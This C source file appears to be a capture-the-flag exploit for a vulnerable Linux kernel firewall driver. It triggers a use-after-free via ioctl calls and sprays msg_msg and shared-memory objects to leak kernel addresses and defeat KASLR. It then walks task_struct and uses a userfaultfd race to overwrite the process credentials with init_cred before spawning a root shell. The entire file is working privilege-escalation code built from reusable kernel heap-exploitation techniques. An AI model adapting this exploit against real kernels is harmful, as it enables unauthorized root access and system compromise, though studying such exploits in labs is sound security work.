#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <byteswap.h>
#include <poll.h>
#include <assert.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/reboot.h>
#include <linux/userfaultfd.h>
#include <arpa/inet.h>
#include <sys/shm.h>

#define UFFDIO_API 0xc018aa3f
#define UFFDIO_REGISTER 0xc020aa00
#define UFFDIO_UNREGISTER 0x8010aa01
#define UFFDIO_COPY 0xc028aa03
#define UFFDIO_ZEROPAGE 0xc020aa04
#define UFFDIO_WAKE 0x8010aa02

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

typedef struct
{
        long mtype;
        char mtext[1];
}msg;

typedef struct 
{
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
}msg_header;

#define INBOUND 0
#define OUTBOUND 1

typedef struct
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
} user_rule_t;

int fd, front_qid, target_qid, final_qid;
int hit = 0;
uint32_t target_msg_idx;
uint64_t target_addr;
pthread_t thread1, thread2, thread3;
uint64_t race_page1, race_page2;
int8_t marker = 0; // for thread sync

uint64_t init_ipc_ns, kbase, init_task, init_cred;

void hexprint(char *buffer, unsigned int bytes)
{
    int dqwords = ((bytes + 0x10 - 1)&0xfffffff0) / 0x10;
    int qwords = dqwords * 2;
    for (int i = 0; i < qwords; i+=2)
    {
        printf("0x%04llx: 0x%016llx 0x%016llx\n", (i * 0x8), ((unsigned long long*)buffer)[i], ((unsigned long long*)buffer)[i+1]);
    }
    puts("-----------------------------------------------");
    return;
}

void gen_dot_notation(char *buf, uint32_t val)
{
    sprintf(buf, "%d.%d.%d.%d", val & 0x000000FF, (val & 0x0000FF00) >> 8, (val & 0x00FF0000) >> 16, (val & 0xFF000000) >> 24);
    return;
}

// we have a 0x2d UAF
void generate(char *input, user_rule_t *req)
{
    char addr[0x10];
    uint32_t ip = *(uint32_t *)&input[0x20];
    uint32_t netmask = *(uint32_t *)&input[0x24];

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, ip);
    memcpy((void *)req->ip, addr, 0x10);

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, netmask);
    memcpy((void *)req->netmask, addr, 0x10);

    memcpy((void *)req->iface, input, 0x10);
    memcpy((void *)req->name, (void *)&input[0x10], 0x10);
    memcpy((void *)&req->proto, (void *)&input[0x28], 2);
    memcpy((void *)&req->port, (void *)&input[0x28 + 2], 2);
    memcpy((void *)&req->action, (void *)&input[0x28 + 2 + 2], 1);

    return;
}

int ioctl(int fd, unsigned long request, unsigned long param) //ioctl wrapper
{
    return syscall(__NR_ioctl, fd, request, param);
}

int add(int fd, uint8_t idx, char *buffer, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, (user_rule_t *)&rule);
    rule.idx = idx;
    rule.type = type;
    return ioctl(fd, ADD_RULE, (unsigned long)&rule);
}

int delete(int fd, uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    return ioctl(fd, DELETE_RULE, (unsigned long)&rule);
}

int edit(int fd, uint8_t idx, char *buffer, int type, int invalidate)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, (user_rule_t *)&rule);
    rule.idx = idx;
    rule.type = type;
    if (invalidate)
    {
        strcpy((void *)&rule.ip, "invalid");
        strcpy((void *)&rule.netmask, "invalid");
    }
    return ioctl(fd, EDIT_RULE, (unsigned long)&rule);   
}

int duplicate(int fd, uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    return ioctl(fd, DUP_RULE, (unsigned long)&rule);
}

int32_t make_queue(key_t key, int msgflg)
{
    int32_t result;
    if ((result = msgget(key, msgflg)) == -1) 
    {
        perror("msgget failure");
        exit(-1);
    }
    return result;
}

void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg)
{
    if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0)
    {
        perror("msgrcv");
        exit(-1);
    }
    return;
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg)
{
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1)
    {
        perror("msgsend failure");
        exit(-1);
    }
    return;
}

void generic_msg_spray(unsigned int size, unsigned int amount)
{
    int qid;
    char buffer[0x1000];
    msg *spray = (msg *)buffer;

    assert(size >= 0x31 && size <= 0x1000 - 0x8);
    spray->mtype = 1;
    memset(spray->mtext, 0, size);

    if ((qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) 
    {
        perror("msgget failure");
        exit(-1);
    }
    for (int i = 0; i < amount; i++)
    {
        if (msgsnd(qid, spray, size - 0x30, 0) == -1)
        {
            perror("msgsend failure");
            exit(-1);
        }
    }
    return;
}

void debug()
{
    puts("pause");
    getchar();
    return;
}

void *trigger_second(void *arg)
{
    uint32_t size = 0x1010;
    msg *dummy_chunk = (void *)race_page2 - 8;
    dummy_chunk->mtype = 10;
    puts("arb freed new segment and triggering second pagefaults");
    send_msg(final_qid, dummy_chunk, size-0x30, 0);
    return NULL;
}

void *first_hang(void *arg)
{
    struct uffd_msg uf_msg;
    struct uffdio_copy uf_copy;
    struct uffdio_range uf_range;
    long uffd = (long)arg;
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    uf_range.start = race_page1;
    uf_range.len = 0x1000;

    while(poll(&pollfd, 1, -1) > 0)
    {
        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
        {
            perror("polling error");
            exit(-1);
        }
        // reading the event
        if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
        {
            perror("error reading event");
            exit(-1);
        }
        if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror("unexpected result from event");
            exit(-1);
        }

        char uf_buffer[0x1000];
        printf("caught pagefault on 0x%llx\n", race_page1);
        // arb free the segment
        get_msg(front_qid, uf_buffer, 0x1000, 0, IPC_NOWAIT | MSG_NOERROR);

        uf_copy.src = (unsigned long)uf_buffer;
        uf_copy.dst = race_page1;
        uf_copy.len = 0x1000;
        uf_copy.mode = 0;
        uf_copy.copy = 0;

        if(pthread_create(&thread3, NULL, trigger_second, NULL) != 0)
        {
            perror("can't setup threads for race");
        }
        while (marker != 1);
        
        memset(uf_buffer, 0x55, sizeof(uf_buffer));
        memcpy((void *)uf_buffer + 0x8 + 0x18, (void *)&target_addr, 8);
        uint64_t evil_size = 0xfe0;
        memcpy((void *)uf_buffer + 0x8 + 0x10, (void *)&evil_size, 8);
        uint64_t evil_type = 10;
        memcpy((void *)uf_buffer + 0x8 + 0x8, (void *)&evil_type, 8);
        memset((void *)uf_buffer + 0x8, 0, 8);
        // we must be careful to hang the second one till the first one is done
        // otherwrise the first one will try to deref a next pointer (second one's linked list pointers) and fall into bad ptr chain


        if(ioctl(uffd, UFFDIO_COPY, (unsigned long)&uf_copy) == -1) // wake it up
        {
            perror("uffdio_copy error");
            exit(-1);
        }
        if (ioctl(uffd, UFFDIO_UNREGISTER, (unsigned long)&uf_range) == -1)
        {
            perror("error unregistering page for userfaultfd");
        }
        if (munmap((void *)race_page1, 0x1000) == -1)
        {
            perror("error on munmapping race page");
        }
        marker = 2;
        pthread_join(thread3, NULL);
        return 0;
    }
    return 0;
}

void *second_hang(void *arg)
{
    struct uffd_msg uf_msg;
    struct uffdio_copy uf_copy;
    struct uffdio_range uf_range;
    long uffd = (long)arg;
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    uf_range.start = race_page2;
    uf_range.len = 0x1000;

    while(poll(&pollfd, 1, -1) > 0)
    {
        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
        {
            perror("polling error");
            exit(-1);
        }
        // reading the event
        if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
        {
            perror("error reading event");
            exit(-1);
        }
        if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror("unexpected result from event");
            exit(-1);
        }

        char uf_buffer[0x1000];
        printf("caught pagefault on 0x%llx\n", race_page2);

        uf_copy.src = (unsigned long)uf_buffer;
        uf_copy.dst = race_page2;
        uf_copy.len = 0x1000;
        uf_copy.mode = 0;
        uf_copy.copy = 0;

        marker = 1;
        while (marker != 2);
        puts("overwriting current cred pointer with init_cred");

        memcpy((void *)uf_buffer + 0xfd0, (void *)&init_cred, 8);
        memcpy((void *)uf_buffer + 0xfd8, (void *)&init_cred, 8);

        if(ioctl(uffd, UFFDIO_COPY, (unsigned long)&uf_copy) == -1) // wake it up
        {
            perror("uffdio_copy error");
            exit(-1);
        }
        if (ioctl(uffd, UFFDIO_UNREGISTER, (unsigned long)&uf_range) == -1)
        {
            perror("error unregistering page for userfaultfd");
        }
        if (munmap((void *)race_page2, 0x1000) == -1)
        {
            perror("error on munmapping race page");
        }
        marker = 3;
        return 0;
    }
    return 0; 
}

void register_userfault(uint64_t race_page, pthread_t thread, void *(*func)(void *))
{
    int uffd, race;
    struct uffdio_api uf_api;
    struct uffdio_register uf_register;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    uf_api.api = UFFD_API;
    uf_api.features = 0;

    if (ioctl(uffd, UFFDIO_API, (unsigned long)&uf_api) == -1)
    {
        perror("error with the uffdio_api");
        exit(-1);
    }

    printf("registering userfaultfd for 0x%llx\n", race_page);
    // page for userfaultfd
    if (mmap((void *)race_page, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != (void *)race_page)
    {
        perror("whoopsie doopsie on mmap");
        exit(-1);
    }

    uf_register.range.start = race_page;
    uf_register.range.len = 0x1000;
    uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

    if (ioctl(uffd, UFFDIO_REGISTER, (unsigned long)&uf_register) == -1)
    {
        perror("error registering page for userfaultfd");
    }

    race = pthread_create(&thread, NULL, func, (void*)(long)uffd);
    if(race != 0)
    {
        perror("can't setup threads for race");
    }
    return;
}

// wait a few seconds after boot before starting exploit
int main(int argc, char **argv, char **envp)
{
    // arb read: allocate two queues, one for a kmalloc 64, another for kmalloc 64 then kmalloc 4k
    // the one in the back will get the extra 4k page chained to kmalloc 32 page
    // read the linked list to see where 4k page is, arb read it from first chunk to get its 32 page leak
    // then arb read that part from front msg_msg struct for kbase leak, walk task_struct same as before
    sleep(3); // i guess early on when just booted, not as stable
    fd = open("/dev/firewalL", O_RDONLY);
    char buffer[0x2000], recieved[0x2000];
    memset(buffer, 0, sizeof(buffer));
    memset(recieved, 0, sizeof(recieved));
    msg *message = (msg *)buffer;
    uint64_t msg_offset;
    msg_header evil;
    uint64_t queue_leak;
    uint32_t size;

    // prepare queues
    final_qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    front_qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    msg *finale = mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
    // for later
    msg *tmp = mmap((void *)0xbaad000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
    race_page1 = 0x1338000;
    race_page2 = 0xbaae000;
    register_userfault(race_page1, thread1, first_hang);
    register_userfault(race_page2, thread1, second_hang);

    if ((fd = open("/dev/firewall", O_RDONLY)) == -1)
    {
        perror("driver interaction failed");
        exit(-1);
    }

    generic_msg_spray(0x40, 50);
    generic_msg_spray(0xf00, 4);

    // spray some more
    for (int i = 0; i < 10; i++)
    {
        add(fd, 0x50 + i, buffer, INBOUND);
    }
    add(fd, 0, buffer, INBOUND);
    duplicate(fd, 0, INBOUND);
    delete(fd, 0, INBOUND); // trigger UAF

    // first step is to leak front_qid's msg_queue address from the msg_msg's linked list 
    // this helps for reconstruction purposes later of msg_msg structs such as when we trigger a free in msg queues
    // when freeing from do_msgrcv, it will try to unlink without MSG_COPY, so better to have it just loop back to queue so no crash

    size = 0x40;
    message->mtype = 1;
    memset(message->mtext, 0x41, size);
    send_msg(front_qid, message, size - 0x30, 0);

    memset((void *)&evil, 0, sizeof(msg_header));
    evil.m_ts = 0xfd0;
    evil.m_type = 1;
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer, (void *)&evil, 0x20);
    edit(fd, 0, buffer, OUTBOUND, 1);

    for (int i = 0; i < 5; i++)
    {
        char tmp_cmp[8];
        int32_t count = 2;
        void *offset;
        size = 0x40;
        message->mtype = count++;
        memset(message->mtext, 0x75 + 1 + i, size);
        memset(tmp_cmp, 0x75 + 1 + i, size);
        send_msg(front_qid, message, size - 0x30, 0);
        get_msg(front_qid, recieved, 0xfd0, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        //hexprint(recieved, 0xfd0);
        if ((offset = memmem(recieved, 0xfd0, tmp_cmp, 8)))
        {
            
            memcpy((void *)&queue_leak, (void *)offset - 0x30, 8);
            printf("front qid queue_leak: 0x%llx\n", queue_leak);
            evil.ll_next = (void *)queue_leak;
            evil.ll_prev = (void *)queue_leak;
            evil.m_type = 1;
            evil.m_ts = 0xfd0;
            memset(buffer, 0, sizeof(buffer));
            memcpy(buffer, (void *)&evil, 0x20);
            edit(fd, 0, buffer, OUTBOUND, 1); // fixes it because traverses from head, mqueue tail isn't traversed from
            break;
        }
        else
        {
            queue_leak = 0x1337;
        }
    }
    if (queue_leak == 0x1337)
    {
        puts("unable to find queue leak");
        exit(-1);
    }

    // hunting for the message queue and msg_msg that can be overwritten from controlled msg of front_qid
    for (int i =0; i < 50; i++)
    {
        char temp_cmp[8];
        target_qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        size = 0x40;
        message->mtype = 1;
        memset(message->mtext, 0x41 + 1 + i, size);
        memset(temp_cmp, 0x41 + 1 + i, 8);
        send_msg(target_qid, message, size - 0x30, 0);
        get_msg(front_qid, recieved, 0xfd0, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        if (memmem(recieved, 0xfd0, temp_cmp, 8))
        {
            puts("found msg_msg to target!");
            msg_offset = (void *)memmem(recieved, 0xfd0, temp_cmp, 8) - (void *)recieved - 0x30; //from perspective of recieved buffer, not in memory
            printf("offset from current UAF'd msg: 0x%llx\n", msg_offset);
            break;
        }
        else
        {
            target_qid = -1;
        }
    }
    if (target_qid == -1)
    {
        puts("unable to get useful later msg_msg to target");
        exit(-1);
    }
    // hexprint(recieved, 0xfd0);

    // leak a 4k msg address
    size = 0x1010;
    message->mtype = 2;
    memset(message->mtext, 0, size);

    // spray shmem beforehand
    int shmid; // shmem leak for kernel data leak to rebase kernel
    void *shmaddr;
    for (int i = 0; i < 0x40; i++)
    {
        if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) 
        {
            perror("shmget error");
            exit(-1);
        }
        shmaddr = shmat(shmid, NULL, 0);
        if (shmaddr == (void *)-1) 
        {
            perror("shmat error");
            exit(-1);
        }
    }
    // just pray qwords above this chunk is null, otherwise kernel panic when we try to arb read from it
    send_msg(target_qid, message, size - 0x30, 0);
    get_msg(front_qid, recieved, 0xfd0, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

    uint64_t big_msg;
    memcpy((void *)&big_msg, (void *)recieved + msg_offset, 8);
    printf("leaked 4k msg_msg address: 0x%llx\n", big_msg);

    // time for kaslr leak, since we are using from shmem structures, fg-kaslr bypassable
    // leak the pointer into kmalloc-32 slab from the 4k msg_msg struct
    evil.m_type = 1;
    evil.m_ts = 0x10f0;
    evil.next = (void *)big_msg - 0x10;
    memcpy(buffer, (void *)&evil, 0x28);
    edit(fd, 0, buffer, OUTBOUND, 0);
    get_msg(front_qid, recieved, 0x10f0, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

    uint64_t kmalloc32_chunk_leak;
    memcpy((void *)&kmalloc32_chunk_leak, (void *)recieved + 0x1000, 8);
    printf("leaked a kmalloc 32 chunk address: 0x%llx\n", kmalloc32_chunk_leak);

    // continue spray
    for (int i = 0; i < 0x40; i++)
    {
        if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) 
        {
            perror("shmget error");
            exit(-1);
        }
        shmaddr = shmat(shmid, NULL, 0);
        if (shmaddr == (void *)-1) 
        {
            perror("shmat error");
            exit(-1);
        }
    }

    // instead of worrying about null qword restriction, just expand size lmao
    evil.m_ts = 0x2000;
    evil.next = (void *)big_msg + 0x20;
    memcpy(buffer, (void *)&evil, 0x28);
    edit(fd, 0, buffer, OUTBOUND, 0);
    get_msg(front_qid, recieved, 0x2000, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    // not 100% here lmao
    memcpy((void *)&init_ipc_ns, (void *)recieved + 0x1ff0, 8);
    kbase = init_ipc_ns - (0xffffffff81c3d7a0 - 0xffffffff81000000);
    init_task = kbase + (0xffffffff81c124c0 - 0xffffffff81000000);
    init_cred = kbase + (0xffffffff81c33060 - 0xffffffff81000000);

    if ((init_ipc_ns & 0xfff) != 0x7a0)
    {
        puts("We got bad leaks");
        exit(-1);
    }

    printf("kernel base: 0x%llx\n", kbase);
    printf("init_task: 0x%llx\n", init_task);
    printf("init_cred: 0x%llx\n", init_cred);

    // walking task struct
    size = 0x1400;
    evil.m_ts = size;
    evil.next = (void *)init_task + 0x298 - 0x8;
    memcpy(buffer, (void *)&evil, 0x28);
    edit(fd, 0, buffer, OUTBOUND, 0);
    get_msg(front_qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

    int32_t pid;
    uint64_t prev, curr;
    memcpy((void*)&prev, (void *)(recieved) + 0xfe0, 8);
    memcpy((void*)&pid, (void *)(recieved) + 0x10d8, 4);

    while (pid != getpid())
    {
        curr = prev - 0x298;
        evil.next = (void *)prev - 0x8;
        memcpy(buffer, (void *)&evil, sizeof(msg_header));
        edit(fd, 0, buffer, OUTBOUND, 0);
        get_msg(front_qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        memcpy((void*)&prev, (void *)(recieved + 0xfe0), 8);
        memcpy((void*)&pid, (void *)(recieved + 0x10d8), 4);
        printf("%d %d\n", pid, getpid());
    }

    printf("[+] found current task struct: 0x%llx\n", curr);
    target_addr = curr + 0x538 - 0x8;

    // now for arb write time
    // to achieve this, have a queue with a msg with 2 chunks in 4k pages
    // use the oob technique to arb read location of 4k msg and its segment (we can use target_qid since we have an offset to its only message already)
    // arb free: use its segment address in yours and free it with msg_rcv (we will need to find its queue address, which we already have)
    // now to gain write, allocate another message (0x2000) after freeing the previous 2 4k chunk msg, hang it at load_msg, arb free the segment
    // then grab another 0x1000 message, this will be where that freed part is, hang this
    // let the first load_msg finish to fill its segment, this will overwrite the 0x1000's next pointer
    // get such control thanks to LIFO
    uint64_t big_segment;
    get_msg(target_qid, recieved, 0x1010, 2, IPC_NOWAIT | MSG_NOERROR);
    size = 0x1f00;
    message->mtype = 2;
    memset(message->mtext, 0x70, size);
    send_msg(target_qid, message, size - 0x30, 0);
    // time to leak this 4k slab
    evil.m_ts = 0xfd0;
    evil.next = (void *)0;
    memcpy(buffer, (void *)&evil, sizeof(msg_header));
    edit(fd, 0, buffer, OUTBOUND, 0);
    get_msg(front_qid, recieved, 0xfd0, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    memcpy((void *)&big_msg, (void *)recieved + msg_offset, 8);
    printf("leaked 4k msg_msg address of 8k msg: 0x%llx\n", big_msg);
    evil.m_ts = 0x10f0;
    evil.next = (void *)big_msg - 0x10;
    memcpy(buffer, (void *)&evil, sizeof(msg_header));
    edit(fd, 0, buffer, OUTBOUND, 0);
    get_msg(front_qid, recieved, 0x10f0, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    memcpy((void *)&big_segment, (void *)recieved + 0x1000, 8);
    printf("leaked 4k msg_msg segment: 0x%llx\n", big_segment);

    // now officially time to hang and arb write
    // because of LIFO, segment is now first, and original msg is now segment
    uint64_t new_big_msg = big_segment;
    uint64_t new_big_segment = big_msg;
    printf("new big message address: 0x%llx\n", new_big_msg);
    printf("new segment address: 0x%llx\n", new_big_segment);

    evil.m_ts = 0x10; // should still free the next pointer
    evil.next = (void *)new_big_segment;
    memcpy(buffer, (void *)&evil, sizeof(msg_header));
    edit(fd, 0, buffer, OUTBOUND, 0);

    get_msg(target_qid, recieved, 0x1f00, 2, IPC_NOWAIT | MSG_NOERROR); //basic cleanup before finale
    finale = (void *)0x1338000 - 0xfd0;
    size = 0x1e00;
    target_msg_idx = 5;
    finale->mtype = target_msg_idx;
    send_msg(target_qid, finale, size - 0x30, 0);

    pthread_join(thread1, NULL);
    pthread_join(thread2, NULL);

    while (marker != 3);

    printf("current uid: %d\n", getuid());

    system("/bin/sh");
}